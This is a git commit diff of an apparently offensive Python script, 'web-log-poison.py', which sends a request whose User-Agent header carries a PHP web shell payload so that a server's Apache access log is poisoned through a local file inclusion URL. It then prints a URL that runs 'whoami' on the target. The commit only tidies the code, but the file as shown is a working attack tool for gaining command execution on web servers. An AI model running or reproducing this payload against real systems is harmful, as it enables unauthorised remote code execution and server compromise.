2782939a7114f5b64333895ebf8fd5cf95b4f7d5
nickpupp0 <nppuppo@gmail.com>
2021-02-25 11:54:17 -0500

    Update web-log-poison.py

--- web-log-poison.py
+++ web-log-poison.py
@@ -1,7 +1,7 @@
-import requests
+#!/usr/bin/python3
+
 import time
-
-
+import requests
                                                                          
 print("                                                       /%")                   
 print("                                                     *&&@@&#")                  
@@ -31,15 +31,15 @@ print("	                 					    ")
                                                                
 
 
-url = input('[+] Enter the full url with the log file - i.e. 10.10.10.10/site/index.php?page=/xampp/apache/logs/access.log\n>> ')
-fullPath='http://'+url
+url = input('[+] Enter the full url with the log file - i.e. http://10.10.10.10/site/index.php?page=/xampp/apache/logs/access.log\n URL: ')
+print(url)
 
 headers = {
     'User-Agent': 'User-Agent: Mozilla/5.0 <?php system($_GET[\'cmd\']); ?> Safari/537.36'
 }
 print("[+] Poisoning...")
 time.sleep(3)
-response = requests.get(fullPath, headers=headers)
+response = requests.get(url, headers=headers)
 print(response)
 print("[+] Log file poisoned!")
 time.sleep(3)
@@ -48,12 +48,7 @@ newHeaders = {
     'User-Agent': 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
 }
 
-commandPath=fullPath+"&cmd=whoami"
+commandPath=url+"&cmd=whoami"
 print("[+] Try the path below to get whoami output - best to view in source-code:\n")
 print(commandPath)
 
-'''
-newResponse=requests.get(fullPath, headers=newHeaders, timeout=2.50)
-print(newResponse)
-
-'''
